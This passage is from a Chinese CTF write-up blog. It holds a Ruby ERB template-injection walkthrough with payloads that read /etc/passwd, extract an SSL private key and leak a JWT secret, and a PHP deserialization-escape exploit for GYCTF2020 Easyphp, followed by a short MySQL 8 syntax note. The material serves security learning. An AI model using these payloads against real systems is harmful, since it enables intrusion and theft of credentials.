<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">get &quot;/work&quot; do</span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#x27;HS256&#x27; &#125;</span><br><span class="line">  auth = auth[0]</span><br><span class="line">  unless params[:SECRET].nil?</span><br><span class="line">    if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;)</span><br><span class="line">      puts ENV[&quot;FLAG&quot;]</span><br><span class="line">    end</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  if params[:do] == &quot;#&#123;params[:name][0,7]&#125; is working&quot; then</span><br><span class="line"></span><br><span class="line">    auth[&quot;jkl&quot;] = auth[&quot;jkl&quot;].to_i + SecureRandom.random_number(10)</span><br><span class="line">    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#x27;HS256&#x27;</span><br><span class="line">    cookies[:auth] = auth</span><br><span class="line">    ERB::new(&quot;&lt;script&gt;alert(&#x27;#&#123;params[:name][0,7]&#125; working successfully!&#x27;)&lt;/script&gt;&quot;).result</span><br><span class="line"></span><br><span class="line">  end</span><br></pre></td></tr></table></figure>
<p>我们可以从</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;#&#123;params[:name][0,7]&#125; working successfully!&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>中的alert()函数，判断它可能是Ruby ERB模板注入</p>
<h2 id="Ruby-ERB模板注入"><a href="#Ruby-ERB模板注入" class="headerlink" title="Ruby ERB模板注入"></a>Ruby ERB模板注入</h2><p>对与Ruby ERB模板注入来说，&lt;%=是用来执行ruby语句的，会将结果转换为字符串，所以我们可以尝试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%=7*7%&gt;</span><br></pre></td></tr></table></figure>
<p>来查看它是否存在ruby erb模板注入，如果存在的话，我们可以使用自带的全局函数来测试是否执行函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%=File.open(&#x27;/etc/passwd&#x27;).read %&gt;</span><br></pre></td></tr></table></figure>
<p>如果不可以成功的话，可能是因为Ruby的ERB模板引擎包含一个安全级别参数，当安全级别设置为0以上的某个值（如：3）时，我们将无法在模板绑定中执行包括文件操作在内的某些函数，如果设置为4，则只可以执行标记为可信状态的那些代码，所以此时我们可以尝试枚举该对象的可用属性以及方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%=self %&gt;</span><br></pre></td></tr></table></figure>



<p>然后可以尝试获取self对象的类名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%=self.class.name %&gt;</span><br></pre></td></tr></table></figure>



<p>得到类名后，我们可以尝试枚举类的可用方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%= self.methods %&gt;</span><br></pre></td></tr></table></figure>
<p>我们可以将数据传递给这些函数，以达到未授权访问的目的，虽然我们不清楚使用的web框架，但是我们要向服务器发送HTTP POST请求，所以我们可以使用handlePOST或doPOST函数内部，来借此访问某些局部变量</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%=self.method(:handle_POST).parameters %&gt;</span><br></pre></td></tr></table></figure>
<p>我们可以看见3个req参数，该参数可能代表的是某个请求对象，rsp参数可能代表的是响应数据的引用，最后session参数可能是某个id或某个对象，所以我们可以查看session对象的具体含义</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%=session.class.name %&gt;</span><br></pre></td></tr></table></figure>
<p>我们可以看见WEBrick是Ruby在标准库中实现的原生web服务器，我们还可以探索其它有用的信息</p>
<p>我们可以使用某些内省方法来确认我们是否可以访问这些变量以及其它可用变量</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%=self.instance_variables %&gt;</span><br></pre></td></tr></table></figure>
<p>当WEBrick被实例化以处理客户端请求时，它会将某个http服务器实例传递给servlet，这很有可能是@server这个实例变量，所以我们可以调用.instance_variables方法来观察这个对象包含哪些成员变量</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%=@server.instance_variables %&gt;</span><br></pre></td></tr></table></figure>
<p>我们可以看见@ssl_context变量，这个变量可能会包含某些密钥或其它有用信息，所以我们可以改变一下语法来创建自己的局部变量，保存@sll_context的引用，使载荷可读性更好</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% ssl=@server.instance_variable_get(:@ssl_context) %&gt;&lt;%= ssl.instance_variables %&gt;</span><br></pre></td></tr></table></figure>
<p>此时我们可以看见有@key，所以我们可以提取出这个变量的值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% ssl = @server.instance_variable_get(:@ssl_context) %&gt;&lt;%= ssl.instance_variable_get(:@key) %&gt;</span><br></pre></td></tr></table></figure>
<p>回到题目本身，我们可以构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&lt;%=7*7 %&gt;&amp;do=&lt;%=7*7 %&gt;%20is%20working</span><br></pre></td></tr></table></figure>
<p>进行测试，发现不可以执行，猜测是因为安全等级的原因，但是可以查看预定义变量，由于前面有进行匹配的操作，且进行匹配的代码是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;)</span><br></pre></td></tr></table></figure>
<p>所以我们可以使用$’预定义变量来进行模板注入，从而读取ENV[“SCERET”]的值，而首先进行的匹配是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;</span><br></pre></td></tr></table></figure>
<p>所以然后再用匹配后的值再进行匹配，所以SECRET参数的值最好为空，所以可以构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&lt;%=$&#x27;%&gt;&amp;do=&lt;%=$&#x27;%&gt;%20is%20working&amp;$SECRET=</span><br></pre></td></tr></table></figure>
<p>来读取ENV[“SECRET”]的值，然后用来伪造jwt，即可获得flag</p>
<p>参考文章：[<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/86867]">https://www.anquanke.com/post/id/86867]</a></p>
<pre><code>[https://www.wangan.com/docs/255]

[https://docs.ruby-lang.org/en/2.4.0/globals_rdoc.html]

[https://www.jianshu.com/p/4f316191f595]
</code></pre>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-pop链4之反序列化逃逸" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/10/14/pop%E9%93%BE4%E4%B9%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8/" class="article-date">
  	<time datetime="2021-10-13T16:00:00.000Z" itemprop="datePublished">2021-10-14</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/10/14/pop%E9%93%BE4%E4%B9%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8/">
        pop链4之反序列化逃逸
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="pop链4之反序列化逃逸-GYCTF2020-Easyphp"><a href="#pop链4之反序列化逃逸-GYCTF2020-Easyphp" class="headerlink" title="pop链4之反序列化逃逸([GYCTF2020]Easyphp)"></a>pop链4之反序列化逃逸([GYCTF2020]Easyphp)</h1><p>打开页面，发现是一个登录界面，所以我们尝试sql注入闭合测试，发现不行，然后dirsearch扫描目录，发现有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.zip</span><br></pre></td></tr></table></figure>
<p>泄露，所以审计源码</p>
<p>在lib.php中的User类中的__destruct()方法有一个危险函数file_get_contents()，但是由于safe函数过滤掉了flag，所以不可以使用，所以我们可以看向update.php文件，发现</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if($_SESSION[&#x27;login&#x27;]===1)&#123;</span><br><span class="line">	require_once(&quot;flag.php&quot;);</span><br><span class="line">	echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是如何让$_SESSION[‘login’]=1，我们可以看向lib.php文件中的User类中的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if($this-&gt;id)&#123;</span><br><span class="line">$_SESSION[&#x27;id&#x27;]=$this-&gt;id;</span><br><span class="line">$_SESSION[&#x27;login&#x27;]=1;</span><br></pre></td></tr></table></figure>
<p>我们可以看见只要存在$this-&gt;id就是可以让$_SESSION[‘login’]为1，而$this-&gt;id实际为dbCtrl类的login()方法中的$idResult，而如果要让return $idResult，则要么</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if ($this-&gt;token==&#x27;admin&#x27;) &#123;</span><br><span class="line">    return $idResult;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>要么绕过这个if</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (md5($this-&gt;password)!==$passwordResult)</span><br></pre></td></tr></table></figure>
<p>而$passwordResult是从数据库中读出来的，所以我们需要控制提交的sql语句，从而绕过if，得到$passwordResult，所以我们要想办法调用dbCtrl类的login()方法，且参数的值为自定义的sql语言，所以我们可以构造pop链</p>
<p>魔术方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__call：对象调用不可访问的函数时可以触发</span><br><span class="line"></span><br><span class="line">__toString()：当类的对象被当作字符串操作时会被调用</span><br></pre></td></tr></table></figure>

<p>所以我们可以构造一条pop链</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UpdateHelper::__destruct() --&gt; User::__toString() --&gt; info::__call()</span><br></pre></td></tr></table></figure>
<p>所以可以exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class User</span><br><span class="line">&#123;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age=&#x27;select id,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&#x27;;</span><br><span class="line">    public $nickname;</span><br><span class="line"></span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;nickname-&gt;update($this-&gt;age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Info&#123;</span><br><span class="line">    public $age;</span><br><span class="line">    public $nickname;</span><br><span class="line">    public $CtrlCase;</span><br><span class="line">    public function __call($name,$argument)&#123;</span><br><span class="line">        $this-&gt;CtrlCase-&gt;login($argument[0]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Class UpdateHelper&#123;</span><br><span class="line">    public $id;</span><br><span class="line">    public $newinfo;</span><br><span class="line">    public $sql;</span><br><span class="line"></span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class dbCtrl</span><br><span class="line">&#123;</span><br><span class="line">    public $hostname=&quot;127.0.0.1&quot;;</span><br><span class="line">    public $dbuser=&quot;root&quot;;</span><br><span class="line">    public $dbpass=&quot;root&quot;;</span><br><span class="line">    public $database=&quot;test&quot;;</span><br><span class="line">    public $name=&#x27;admin&#x27;;</span><br><span class="line">    public $password=&#x27;1&#x27;;//字符串1，不是数字1</span><br><span class="line">    public $mysqli;</span><br><span class="line">    public $token;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=new UpdateHelper();</span><br><span class="line">$a-&gt;sql=new User();</span><br><span class="line">$a-&gt;sql-&gt;nickname=new Info();</span><br><span class="line">$a-&gt;sql-&gt;nickname-&gt;CtrlCase=new dbCtrl();</span><br><span class="line"></span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>而由于这里是反序列化实例化对象，所以我们也需要将上面得到的结果放入Info类中，exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class User</span><br><span class="line">&#123;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age=&#x27;select id,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&#x27;;</span><br><span class="line">    public $nickname;</span><br><span class="line"></span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;nickname-&gt;update($this-&gt;age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Info&#123;</span><br><span class="line">    public $age;</span><br><span class="line">    public $nickname;</span><br><span class="line">    public $CtrlCase;</span><br><span class="line">    public function __call($name,$argument)&#123;</span><br><span class="line">        $this-&gt;CtrlCase-&gt;login($argument[0]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Class UpdateHelper&#123;</span><br><span class="line">    public $id;</span><br><span class="line">    public $newinfo;</span><br><span class="line">    public $sql;</span><br><span class="line"></span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class dbCtrl</span><br><span class="line">&#123;</span><br><span class="line">    public $hostname=&quot;127.0.0.1&quot;;</span><br><span class="line">    public $dbuser=&quot;root&quot;;</span><br><span class="line">    public $dbpass=&quot;root&quot;;</span><br><span class="line">    public $database=&quot;test&quot;;</span><br><span class="line">    public $name=&#x27;admin&#x27;;</span><br><span class="line">    public $password=&#x27;1&#x27;;//字符串1，不是数字1</span><br><span class="line">    public $mysqli;</span><br><span class="line">    public $token;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=new UpdateHelper();</span><br><span class="line">$a-&gt;sql=new User();</span><br><span class="line">$a-&gt;sql-&gt;nickname=new Info();</span><br><span class="line">$a-&gt;sql-&gt;nickname-&gt;CtrlCase=new dbCtrl();</span><br><span class="line"></span><br><span class="line">$b=new Info();</span><br><span class="line">$b-&gt;nickname=serialize($a);</span><br><span class="line">echo srialize($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;N;s:8:&quot;nickname&quot;;s:447:&quot;O:12:&quot;UpdateHelper&quot;:3:&#123;s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:71:&quot;select id,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;N;s:8:&quot;nickname&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;N;&#125;&#125;&#125;&#125;&quot;;s:8:&quot;CtrlCase&quot;;N;&#125;</span><br></pre></td></tr></table></figure>

<p>由于它还要经过序列化，所以我们可以通过反序列化逃逸来绕过它这次的序列化，我们可以将这部分分离出来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:12:&quot;UpdateHelper&quot;:3:&#123;s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:71:&quot;select id,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;N;s:8:&quot;nickname&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;N;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>然后在前面加上</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;s:8:&quot;CtrlCase&quot;;</span><br></pre></td></tr></table></figure>
<p>因为要与原来的一样，然后由于有safe函数，所以可以利用union替换为hacker增加一个字符，所以我们可以构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:3:&#123;s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:71:&quot;select id,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;N;s:8:&quot;nickname&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;N;&#125;&#125;&#125;&#125;;&#125;</span><br></pre></td></tr></table></figure>
<p>此时$_SESSION[‘token’]=”admin”，所以我们回到登录界面，任意登录即可获得flag</p>
<p>参考文章：[<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/21b5dd45724c]">https://www.jianshu.com/p/21b5dd45724c]</a></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-table语句" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/10/14/table%E8%AF%AD%E5%8F%A5/" class="article-date">
  	<time datetime="2021-10-13T16:00:00.000Z" itemprop="datePublished">2021-10-14</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/10/14/table%E8%AF%AD%E5%8F%A5/">
        table语句
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="table语句"><a href="#table语句" class="headerlink" title="table语句"></a>table语句</h1><p>mysql8版本上线了新的特性，就是table语句和VALUES语句</p>
<h2 id="table语句-1"><a href="#table语句-1" class="headerlink" title="table语句"></a>table语句</h2><p>作用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 具体用来在小表的扫描，如：路由表、配置类表、简单映射表等</span><br><span class="line"></span><br><span class="line">2. 用来替换是被当做子查询的这类小表的SELECT语句</span><br></pre></td></tr></table></figure>

<p>具体语法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table table_name [order by column_name] [LIMIT number [OFFSET number]]</span><br></pre></td></tr></table></figure>
<p>从语法中的order by column_name可以看出，可以排序，也可以过滤记录集</p>
<h3 id="简单全表扫描"><a href="#简单全表扫描" class="headerlink" title="简单全表扫描"></a>简单全表扫描</h3><p>传统语法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from t1;</span><br></pre></td></tr></table></figure>

<p>table语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table t1;</span><br></pre></td></tr></table></figure>

<h2 id="VALUES语句"><a href="#VALUES语句" class="headerlink" title="VALUES语句"></a>VALUES语句</h2><p>作用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用做功能展示或快速造数据场景，结果列名字以column_0开头，以此类推</span><br></pre></td></tr></table></figure>

<h3 id="单条values语句"><a href="#单条values语句" class="headerlink" title="单条values语句"></a>单条values语句</h3><p>语法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">values row(1,2,3);</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">+----------+----------+----------+</span><br><span class="line">| column_0 | column_1 | column_2 |</span><br><span class="line">+----------+----------+----------+</span><br><span class="line">|        1|        2|        3|</span><br><span class="line">+----------+----------+----------+</span><br><span class="line">1 row inset(0.00 sec)</span><br></pre></td></tr></table></figure>

<h3 id="多条values语句"><a href="#多条values语句" class="headerlink" title="多条values语句"></a>多条values语句</h3><p>语法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">values row(1,2,3),row(10,9,8);</span><br></pre></td></tr></table></figure>

<p>结果</p>
